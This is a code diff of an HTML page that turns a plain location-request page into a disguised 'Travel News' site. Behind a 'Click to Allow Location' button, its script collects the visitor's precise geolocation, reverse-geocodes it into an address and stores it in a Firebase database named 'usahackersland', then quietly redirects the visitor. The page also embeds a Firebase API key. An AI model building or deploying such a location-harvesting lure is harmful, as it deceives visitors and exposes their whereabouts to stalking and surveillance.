@@ -1,17 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Click to Continue</title>
+  <title>Travel News</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: Arial; background:#f9f9f9; margin:0; padding:0; }
+    header { text-align:center; padding:20px; background:#2196F3; color:white; }
+    h1 { margin:0; }
+    .container { display:flex; flex-wrap:wrap; justify-content:center; padding:20px; }
+    .card {
+      width:300px;
+      background:white;
+      margin:10px;
+      border-radius:10px;
+      overflow:hidden;
+      box-shadow:0 2px 6px rgba(0,0,0,0.2);
+      cursor:pointer;
+      transition:transform 0.2s;
+    }
+    .card:hover { transform:scale(1.03); }
+    .card img { width:100%; height:200px; object-fit:cover; }
+    .card .desc { padding:10px; }
+    .allow-btn {
+      display:block;
+      margin:20px auto;
+      padding:15px 25px;
+      font-size:18px;
+      background:#FF5722;
+      color:white;
+      border:none;
+      border-radius:5px;
+      cursor:pointer;
+    }
+  </style>
 </head>
 <body>
-  <h2>Click “Allow” to share your location</h2>
+  <header>
+    <h1>🌍 Travel News</h1>
+  </header>
+
+  <div class="container">
+    <div class="card">
+      <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e" alt="Beach">
+      <div class="desc">
+        <h3>Sunny Beach Destinations</h3>
+        <p>Explore the most beautiful sunny beaches around the world.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee" alt="Mountains">
+      <div class="desc">
+        <h3>Majestic Mountains</h3>
+        <p>Discover breathtaking mountain views and adventurous trails.</p>
+      </div>
+    </div>
+  </div>
+
+  <button class="allow-btn" id="allowBtn">Click to Allow Location</button>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    // 🔑 REPLACE WITH YOUR FIREBASE CONFIG
     const firebaseConfig = {
       apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
       authDomain: "usahackersland.firebaseapp.com",
@@ -22,14 +73,17 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    if (!navigator.geolocation) {
-      alert("Geolocation not supported on your browser");
-    } else {
+    document.getElementById("allowBtn").addEventListener("click", () => {
+      if (!navigator.geolocation) {
+        alert("Geolocation not supported by your browser");
+        return;
+      }
+
       navigator.geolocation.getCurrentPosition(async pos => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
 
-        // Reverse geocode with OpenStreetMap
+        // Reverse geocode using OpenStreetMap
         const geo = await fetch(
           `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
         ).then(r => r.json());
@@ -43,16 +97,18 @@
             time: new Date().toISOString()
           });
 
-          document.body.innerHTML = "<h3>✅ Location submitted. Thank you!</h3>";
+          // Redirect after saving location
+          window.location.href = "https://www.example.com"; // <-- change to your desired URL
+
         } catch (err) {
-          document.body.innerHTML = "<h3>❌ Error submitting location</h3>";
+          alert("Error saving location");
           console.error(err);
         }
 
       }, () => {
-        alert("Location permission denied");
-      }, { enableHighAccuracy: true });
-    }
+        alert("Location permission denied. Please allow to continue.");
+      }, { enableHighAccuracy:true });
+    });
   </script>
 </body>
 </html>
